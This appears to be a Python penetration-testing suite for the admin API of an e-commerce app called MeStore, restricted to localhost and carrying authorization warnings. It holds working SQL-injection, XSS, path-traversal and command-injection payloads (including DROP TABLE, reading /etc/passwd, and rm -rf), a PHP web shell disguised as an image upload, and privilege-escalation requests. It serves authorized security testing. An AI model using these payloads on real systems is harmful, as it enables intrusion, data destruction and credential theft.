#!/usr/bin/env python3
"""
COMPREHENSIVE ADMIN SECURITY TESTING SUITE
==========================================

This script performs comprehensive security testing on MeStore admin endpoints
to validate the vulnerabilities identified in the security audit.

Author: Cybersecurity AI - Security Testing Specialist
Date: 2025-09-21
Framework: Custom penetration testing framework
Target: MeStore Admin Management Endpoints

SECURITY TESTING CATEGORIES:
1. Authentication & Authorization Testing
2. Input Validation & Injection Testing
3. File Upload/Download Security Testing
4. API Security & Rate Limiting Testing
5. Session Management Testing
6. Privilege Escalation Testing

WARNING: This script contains actual exploit code for testing purposes.
Only run in authorized testing environments.
"""

import requests
import json
import time
import uuid
import base64
import os
import sys
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime, timedelta
import hashlib
import jwt
import subprocess
import tempfile
from pathlib import Path


class SecurityTestConfig:
    """Configuration for security testing"""
    BASE_URL = "http://localhost:8000"
    API_BASE = "/api/v1"
    ADMIN_EMAIL = "security_test@test.com"
    ADMIN_PASSWORD = "SecureTestPassword123!"
    TEST_TIMEOUT = 30
    MAX_RETRY_ATTEMPTS = 3

    # Security test payloads
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' UNION SELECT password_hash FROM users WHERE user_type='SUPERUSER'--",
        "'; INSERT INTO users (email, password_hash, user_type) VALUES ('hacker@evil.com', 'hashed', 'SUPERUSER'); --",
        "' OR '1'='1' --",
        "'; DELETE FROM admin_permissions; --"
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//"
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../../app/core/config.py",
        "../../../docker-compose.yml",
        "..\\..\\..\\app\\models\\user.py"
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "| ls -la",
        "&& whoami",
        "; rm -rf /tmp/*",
        "` id `"
    ]


class SecurityTestResult:
    """Container for security test results"""
    def __init__(self, test_name: str):
        self.test_name = test_name
        self.start_time = datetime.now()
        self.end_time = None
        self.status = "RUNNING"
        self.vulnerabilities_found = []
        self.risk_level = "UNKNOWN"
        self.details = {}
        self.exploit_successful = False
        self.error_message = None

    def complete(self, status: str, risk_level: str = "UNKNOWN"):
        self.end_time = datetime.now()
        self.status = status
        self.risk_level = risk_level
        self.duration = (self.end_time - self.start_time).total_seconds()

    def add_vulnerability(self, vuln_name: str, description: str, payload: str = "", response: str = ""):
        vulnerability = {
            "name": vuln_name,
            "description": description,
            "payload": payload,
            "response": response[:500],  # Limit response size
            "timestamp": datetime.now().isoformat()
        }
        self.vulnerabilities_found.append(vulnerability)
        self.exploit_successful = True


class AdminSecurityTester:
    """Comprehensive admin security testing framework"""

    def __init__(self, config: SecurityTestConfig):
        self.config = config
        self.session = requests.Session()
        self.auth_token = None
        self.admin_user_id = None
        self.test_results = []

        # Set up session with security headers
        self.session.headers.update({
            'User-Agent': 'SecurityTester/1.0 (AdminSecurityAudit)',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })

    def log_security_event(self, event: str, details: Dict[str, Any] = None):
        """Log security testing events"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "event": event,
            "details": details or {},
            "session_id": id(self.session)
        }
        print(f"[{timestamp}] SECURITY_TEST: {event}")
        if details:
            print(f"                    Details: {json.dumps(details, indent=2)}")

    def setup_test_environment(self) -> bool:
        """Set up test environment and authenticate"""
        try:
            self.log_security_event("SETUP_START", {"target": self.config.BASE_URL})

            # Test connectivity
            response = self.session.get(f"{self.config.BASE_URL}/health", timeout=self.config.TEST_TIMEOUT)
            if response.status_code != 200:
                self.log_security_event("SETUP_FAILED", {"reason": "Service not available"})
                return False

            # Create test admin user for authentication testing
            self.create_test_admin()

            # Authenticate
            self.authenticate_admin()

            self.log_security_event("SETUP_COMPLETE", {"auth_token": bool(self.auth_token)})
            return True

        except Exception as e:
            self.log_security_event("SETUP_ERROR", {"error": str(e)})
            return False

    def create_test_admin(self):
        """Create test admin user"""
        admin_data = {
            "email": self.config.ADMIN_EMAIL,
            "password": self.config.ADMIN_PASSWORD,
            "nombre": "Security",
            "apellido": "Tester",
            "user_type": "ADMIN"
        }

        try:
            # Try to register admin user
            response = self.session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/auth/register",
                json=admin_data,
                timeout=self.config.TEST_TIMEOUT
            )

            if response.status_code in [200, 201, 409]:  # 409 = already exists
                self.log_security_event("TEST_ADMIN_READY", {"email": self.config.ADMIN_EMAIL})
            else:
                self.log_security_event("TEST_ADMIN_CREATION_FAILED", {
                    "status_code": response.status_code,
                    "response": response.text[:200]
                })
        except Exception as e:
            self.log_security_event("TEST_ADMIN_ERROR", {"error": str(e)})

    def authenticate_admin(self):
        """Authenticate admin user and get token"""
        auth_data = {
            "username": self.config.ADMIN_EMAIL,
            "password": self.config.ADMIN_PASSWORD
        }

        try:
            response = self.session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/auth/login",
                data=auth_data,  # OAuth2 uses form data
                timeout=self.config.TEST_TIMEOUT
            )

            if response.status_code == 200:
                token_data = response.json()
                self.auth_token = token_data.get("access_token")
                self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})

                # Extract user ID from token
                try:
                    payload = jwt.decode(self.auth_token, options={"verify_signature": False})
                    self.admin_user_id = payload.get("user_id") or payload.get("sub")
                except:
                    pass

                self.log_security_event("AUTHENTICATION_SUCCESS", {"user_id": self.admin_user_id})
            else:
                self.log_security_event("AUTHENTICATION_FAILED", {
                    "status_code": response.status_code,
                    "response": response.text[:200]
                })
        except Exception as e:
            self.log_security_event("AUTHENTICATION_ERROR", {"error": str(e)})

    def test_privilege_escalation(self) -> SecurityTestResult:
        """Test for privilege escalation vulnerabilities"""
        result = SecurityTestResult("Privilege Escalation Testing")

        try:
            self.log_security_event("STARTING_PRIVILEGE_ESCALATION_TESTS")

            # Test 1: Create admin with lower clearance then escalate
            new_admin_data = {
                "email": f"escalation_test_{uuid.uuid4().hex[:8]}@test.com",
                "nombre": "Escalation",
                "apellido": "Test",
                "user_type": "ADMIN",
                "security_clearance_level": 2
            }

            # Create lower-privilege admin
            response = self.session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                json=new_admin_data,
                timeout=self.config.TEST_TIMEOUT
            )

            if response.status_code in [200, 201]:
                created_admin = response.json()
                target_admin_id = created_admin.get("id")

                result.add_vulnerability(
                    "Admin Creation Allowed",
                    "Successfully created admin with lower clearance level",
                    json.dumps(new_admin_data),
                    response.text[:200]
                )

                # Test 2: Try to escalate clearance level
                escalation_data = {"security_clearance_level": 5}

                escalation_response = self.session.put(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins/{target_admin_id}",
                    json=escalation_data,
                    timeout=self.config.TEST_TIMEOUT
                )

                if escalation_response.status_code in [200, 201]:
                    result.add_vulnerability(
                        "CRITICAL: Privilege Escalation Successful",
                        "Successfully escalated admin clearance level to maximum",
                        json.dumps(escalation_data),
                        escalation_response.text[:200]
                    )
                    result.risk_level = "CRITICAL"

                # Test 3: Grant dangerous permissions
                dangerous_permissions = ["users.manage.global", "system.admin.full"]
                permission_data = {
                    "permission_ids": dangerous_permissions,
                    "reason": "Security testing privilege escalation"
                }

                permission_response = self.session.post(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins/{target_admin_id}/permissions/grant",
                    json=permission_data,
                    timeout=self.config.TEST_TIMEOUT
                )

                if permission_response.status_code in [200, 201]:
                    result.add_vulnerability(
                        "CRITICAL: Permission Escalation Successful",
                        "Successfully granted high-level permissions to test admin",
                        json.dumps(permission_data),
                        permission_response.text[:200]
                    )
                    result.risk_level = "CRITICAL"

            result.complete("COMPLETED", result.risk_level or "HIGH")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("PRIVILEGE_ESCALATION_ERROR", {"error": str(e)})

        return result

    def test_sql_injection(self) -> SecurityTestResult:
        """Test for SQL injection vulnerabilities"""
        result = SecurityTestResult("SQL Injection Testing")

        try:
            self.log_security_event("STARTING_SQL_INJECTION_TESTS")

            for payload in self.config.SQL_INJECTION_PAYLOADS:
                # Test search parameter injection
                response = self.session.get(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                    params={"search": payload},
                    timeout=self.config.TEST_TIMEOUT
                )

                # Look for SQL injection indicators
                response_text = response.text.lower()
                sql_error_indicators = [
                    "sql syntax error",
                    "mysql_fetch",
                    "ora-",
                    "postgresql error",
                    "sqlite error",
                    "column doesn't exist",
                    "syntax error at or near"
                ]

                for indicator in sql_error_indicators:
                    if indicator in response_text:
                        result.add_vulnerability(
                            "CRITICAL: SQL Injection Vulnerability Detected",
                            f"SQL error exposed with payload: {payload}",
                            payload,
                            response.text[:300]
                        )
                        result.risk_level = "CRITICAL"
                        break

                # Check for unusual response patterns
                if response.status_code == 200 and len(response.text) > 10000:
                    # Suspiciously large response might indicate data extraction
                    result.add_vulnerability(
                        "HIGH: Potential SQL Injection Data Extraction",
                        f"Large response with injection payload suggests data extraction",
                        payload,
                        f"Response size: {len(response.text)} bytes"
                    )
                    result.risk_level = "HIGH"

                time.sleep(0.1)  # Avoid overwhelming server

            result.complete("COMPLETED", result.risk_level or "LOW")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("SQL_INJECTION_ERROR", {"error": str(e)})

        return result

    def test_file_upload_security(self) -> SecurityTestResult:
        """Test file upload security vulnerabilities"""
        result = SecurityTestResult("File Upload Security Testing")

        try:
            self.log_security_event("STARTING_FILE_UPLOAD_TESTS")

            # Test 1: Upload executable file disguised as image
            malicious_content = b"\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']); ?>"

            files = {
                'files': ('malicious.jpg', malicious_content, 'image/jpeg')
            }
            data = {
                'photo_types': ['general'],
                'descriptions': ['Test upload']
            }

            # Find a test queue_id (try some common IDs)
            test_queue_id = 1
            response = self.session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/incoming-products/{test_queue_id}/verification/upload-photos",
                files=files,
                data=data,
                timeout=self.config.TEST_TIMEOUT
            )

            if response.status_code in [200, 201]:
                result.add_vulnerability(
                    "CRITICAL: Malicious File Upload Successful",
                    "Successfully uploaded PHP code disguised as image",
                    "malicious.jpg with PHP payload",
                    response.text[:200]
                )
                result.risk_level = "CRITICAL"

            # Test 2: Path traversal in file upload
            traversal_files = {
                'files': ('../../evil.php', b'<?php echo "Path traversal success"; ?>', 'image/jpeg')
            }

            traversal_response = self.session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/incoming-products/{test_queue_id}/verification/upload-photos",
                files=traversal_files,
                data=data,
                timeout=self.config.TEST_TIMEOUT
            )

            if traversal_response.status_code in [200, 201]:
                result.add_vulnerability(
                    "HIGH: Path Traversal in File Upload",
                    "File upload accepts path traversal in filename",
                    "../../evil.php",
                    traversal_response.text[:200]
                )
                result.risk_level = "HIGH"

            result.complete("COMPLETED", result.risk_level or "MEDIUM")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("FILE_UPLOAD_ERROR", {"error": str(e)})

        return result

    def test_path_traversal(self) -> SecurityTestResult:
        """Test path traversal vulnerabilities"""
        result = SecurityTestResult("Path Traversal Testing")

        try:
            self.log_security_event("STARTING_PATH_TRAVERSAL_TESTS")

            # Test endpoints that serve files
            file_endpoints = [
                "/qr-codes/",
                "/labels/",
                "/verification-photos/"
            ]

            for endpoint in file_endpoints:
                for payload in self.config.PATH_TRAVERSAL_PAYLOADS:
                    try:
                        response = self.session.get(
                            f"{self.config.BASE_URL}{self.config.API_BASE}{endpoint}{payload}",
                            timeout=self.config.TEST_TIMEOUT
                        )

                        # Check for successful path traversal
                        if response.status_code == 200:
                            response_text = response.text.lower()

                            # Look for system file indicators
                            system_indicators = [
                                "root:x:",  # /etc/passwd
                                "database_url",  # config files
                                "secret_key",  # config files
                                "version:",  # system files
                                "docker",  # docker-compose.yml
                                "class user"  # Python model files
                            ]

                            for indicator in system_indicators:
                                if indicator in response_text:
                                    result.add_vulnerability(
                                        "CRITICAL: Path Traversal Successful",
                                        f"Successfully read system file via {endpoint}",
                                        payload,
                                        response.text[:300]
                                    )
                                    result.risk_level = "CRITICAL"
                                    break

                        time.sleep(0.1)  # Rate limiting

                    except requests.exceptions.Timeout:
                        continue  # Skip timeouts
                    except Exception as e:
                        self.log_security_event("PATH_TRAVERSAL_ENDPOINT_ERROR", {
                            "endpoint": endpoint,
                            "payload": payload,
                            "error": str(e)
                        })

            result.complete("COMPLETED", result.risk_level or "LOW")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("PATH_TRAVERSAL_ERROR", {"error": str(e)})

        return result

    def test_xss_vulnerabilities(self) -> SecurityTestResult:
        """Test for XSS vulnerabilities"""
        result = SecurityTestResult("XSS Vulnerability Testing")

        try:
            self.log_security_event("STARTING_XSS_TESTS")

            for payload in self.config.XSS_PAYLOADS:
                # Test XSS in admin creation
                xss_admin_data = {
                    "email": f"xss_test_{uuid.uuid4().hex[:8]}@test.com",
                    "nombre": payload,  # XSS in name field
                    "apellido": "Test",
                    "user_type": "ADMIN",
                    "security_clearance_level": 2
                }

                response = self.session.post(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                    json=xss_admin_data,
                    timeout=self.config.TEST_TIMEOUT
                )

                if response.status_code in [200, 201]:
                    # Check if XSS payload is reflected
                    list_response = self.session.get(
                        f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                        timeout=self.config.TEST_TIMEOUT
                    )

                    if payload in list_response.text:
                        result.add_vulnerability(
                            "HIGH: Stored XSS Vulnerability",
                            f"XSS payload stored and reflected in admin list",
                            payload,
                            list_response.text[:300]
                        )
                        result.risk_level = "HIGH"

                time.sleep(0.1)

            result.complete("COMPLETED", result.risk_level or "LOW")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("XSS_ERROR", {"error": str(e)})

        return result

    def test_rate_limiting(self) -> SecurityTestResult:
        """Test rate limiting protection"""
        result = SecurityTestResult("Rate Limiting Testing")

        try:
            self.log_security_event("STARTING_RATE_LIMITING_TESTS")

            # Test rapid requests to admin list endpoint
            rapid_requests = 50
            successful_requests = 0
            rate_limited_requests = 0

            start_time = time.time()

            for i in range(rapid_requests):
                response = self.session.get(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                    timeout=5
                )

                if response.status_code == 200:
                    successful_requests += 1
                elif response.status_code == 429:  # Too Many Requests
                    rate_limited_requests += 1

                # Don't sleep to test rate limiting

            end_time = time.time()
            duration = end_time - start_time
            requests_per_second = rapid_requests / duration

            result.details = {
                "total_requests": rapid_requests,
                "successful_requests": successful_requests,
                "rate_limited_requests": rate_limited_requests,
                "duration": duration,
                "requests_per_second": requests_per_second
            }

            # If all requests succeeded, rate limiting is missing
            if successful_requests == rapid_requests:
                result.add_vulnerability(
                    "HIGH: No Rate Limiting Protection",
                    f"All {rapid_requests} rapid requests succeeded in {duration:.2f}s",
                    f"{requests_per_second:.2f} requests/second",
                    f"No 429 responses received"
                )
                result.risk_level = "HIGH"

            result.complete("COMPLETED", result.risk_level or "LOW")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("RATE_LIMITING_ERROR", {"error": str(e)})

        return result

    def test_session_management(self) -> SecurityTestResult:
        """Test session management security"""
        result = SecurityTestResult("Session Management Testing")

        try:
            self.log_security_event("STARTING_SESSION_MANAGEMENT_TESTS")

            # Test 1: Token validation after privilege change
            if self.admin_user_id:
                # Update admin (privilege change)
                update_data = {"nombre": "Updated Name"}
                update_response = self.session.put(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins/{self.admin_user_id}",
                    json=update_data,
                    timeout=self.config.TEST_TIMEOUT
                )

                if update_response.status_code in [200, 201]:
                    # Check if old token still works
                    check_response = self.session.get(
                        f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                        timeout=self.config.TEST_TIMEOUT
                    )

                    if check_response.status_code == 200:
                        result.add_vulnerability(
                            "MEDIUM: Session Not Invalidated After Privilege Change",
                            "Token remains valid after admin privilege modification",
                            "Admin update operation",
                            "Token still accepts requests"
                        )
                        result.risk_level = "MEDIUM"

            # Test 2: Concurrent session handling
            # Create second session with same credentials
            second_session = requests.Session()
            auth_data = {
                "username": self.config.ADMIN_EMAIL,
                "password": self.config.ADMIN_PASSWORD
            }

            auth_response = second_session.post(
                f"{self.config.BASE_URL}{self.config.API_BASE}/auth/login",
                data=auth_data,
                timeout=self.config.TEST_TIMEOUT
            )

            if auth_response.status_code == 200:
                token_data = auth_response.json()
                second_token = token_data.get("access_token")
                second_session.headers.update({"Authorization": f"Bearer {second_token}"})

                # Test if both sessions work concurrently
                first_response = self.session.get(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                    timeout=self.config.TEST_TIMEOUT
                )

                second_response = second_session.get(
                    f"{self.config.BASE_URL}{self.config.API_BASE}/admins",
                    timeout=self.config.TEST_TIMEOUT
                )

                if first_response.status_code == 200 and second_response.status_code == 200:
                    result.add_vulnerability(
                        "MEDIUM: Concurrent Sessions Allowed",
                        "Multiple concurrent sessions allowed for same admin user",
                        "Dual session authentication",
                        "Both sessions remain active"
                    )
                    result.risk_level = "MEDIUM"

            result.complete("COMPLETED", result.risk_level or "LOW")

        except Exception as e:
            result.error_message = str(e)
            result.complete("ERROR")
            self.log_security_event("SESSION_MANAGEMENT_ERROR", {"error": str(e)})

        return result

    def run_comprehensive_security_test(self) -> List[SecurityTestResult]:
        """Run all security tests and return results"""
        self.log_security_event("STARTING_COMPREHENSIVE_SECURITY_TEST")

        if not self.setup_test_environment():
            self.log_security_event("SECURITY_TEST_ABORTED", {"reason": "Environment setup failed"})
            return []

        # Run all security tests
        test_methods = [
            self.test_privilege_escalation,
            self.test_sql_injection,
            self.test_file_upload_security,
            self.test_path_traversal,
            self.test_xss_vulnerabilities,
            self.test_rate_limiting,
            self.test_session_management
        ]

        for test_method in test_methods:
            try:
                result = test_method()
                self.test_results.append(result)

                self.log_security_event("TEST_COMPLETED", {
                    "test_name": result.test_name,
                    "status": result.status,
                    "risk_level": result.risk_level,
                    "vulnerabilities_found": len(result.vulnerabilities_found),
                    "exploit_successful": result.exploit_successful
                })

            except Exception as e:
                self.log_security_event("TEST_FAILED", {
                    "test_method": test_method.__name__,
                    "error": str(e)
                })

        self.generate_security_report()
        return self.test_results

    def generate_security_report(self):
        """Generate comprehensive security test report"""
        total_vulnerabilities = sum(len(result.vulnerabilities_found) for result in self.test_results)
        critical_vulns = sum(1 for result in self.test_results if result.risk_level == "CRITICAL")
        high_vulns = sum(1 for result in self.test_results if result.risk_level == "HIGH")

        report = {
            "test_summary": {
                "total_tests": len(self.test_results),
                "total_vulnerabilities": total_vulnerabilities,
                "critical_vulnerabilities": critical_vulns,
                "high_vulnerabilities": high_vulns,
                "test_timestamp": datetime.now().isoformat(),
                "target_system": self.config.BASE_URL
            },
            "test_results": []
        }

        for result in self.test_results:
            test_data = {
                "test_name": result.test_name,
                "status": result.status,
                "risk_level": result.risk_level,
                "duration": getattr(result, 'duration', 0),
                "vulnerabilities_found": result.vulnerabilities_found,
                "exploit_successful": result.exploit_successful,
                "error_message": result.error_message,
                "details": result.details
            }
            report["test_results"].append(test_data)

        # Save report to file
        report_filename = f"security_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)

        self.log_security_event("SECURITY_REPORT_GENERATED", {
            "filename": report_filename,
            "total_vulnerabilities": total_vulnerabilities,
            "critical_vulnerabilities": critical_vulns
        })

        # Print summary
        print("\\n" + "="*80)
        print("COMPREHENSIVE SECURITY TEST SUMMARY")
        print("="*80)
        print(f"Total Tests Run: {len(self.test_results)}")
        print(f"Total Vulnerabilities Found: {total_vulnerabilities}")
        print(f"Critical Risk Vulnerabilities: {critical_vulns}")
        print(f"High Risk Vulnerabilities: {high_vulns}")
        print(f"Report saved to: {report_filename}")
        print("="*80)


def main():
    """Main entry point for security testing"""
    print("MeStore Admin Security Testing Suite")
    print("====================================")
    print("WARNING: This tool performs actual penetration testing.")
    print("Only run against authorized systems.")
    print()

    # Initialize configuration
    config = SecurityTestConfig()

    # Check if running against localhost (safer)
    if "localhost" not in config.BASE_URL and "127.0.0.1" not in config.BASE_URL:
        print("ERROR: This script should only be run against localhost for safety.")
        print("Modify the BASE_URL in SecurityTestConfig if you have authorization.")
        sys.exit(1)

    # Initialize tester
    tester = AdminSecurityTester(config)

    # Run comprehensive security test
    print(f"Starting security test against: {config.BASE_URL}")
    print("This may take several minutes...")
    print()

    results = tester.run_comprehensive_security_test()

    # Display critical findings
    critical_findings = []
    for result in results:
        for vuln in result.vulnerabilities_found:
            if "CRITICAL" in vuln["name"]:
                critical_findings.append(vuln)

    if critical_findings:
        print("\\n🚨 CRITICAL SECURITY VULNERABILITIES FOUND:")
        print("-" * 50)
        for finding in critical_findings:
            print(f"• {finding['name']}")
            print(f"  Description: {finding['description']}")
            print(f"  Payload: {finding['payload']}")
            print()

    print("\\nSecurity testing completed.")
    print("Review the generated report for detailed findings.")


if __name__ == "__main__":
    main()